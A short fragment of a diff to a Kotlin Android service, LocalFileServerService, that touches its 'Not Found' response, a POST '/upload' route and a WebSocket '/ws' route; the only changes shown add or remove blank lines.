                     call.respondText("Not Found", status = HttpStatusCode.NotFound)
                 }
             }
+
+
 
 
             post("/upload") {
@@ -1942,6 +2310,8 @@ class LocalFileServerService : Service() {
                 }
                 call.respondText("Upload Complete", ContentType.Text.Plain)
             }
+
+
 
 
             webSocket("/ws") {
@@ -1966,5 +2336,3 @@ class LocalFileServerService : Service() {
         }
     }
 }
- 
-
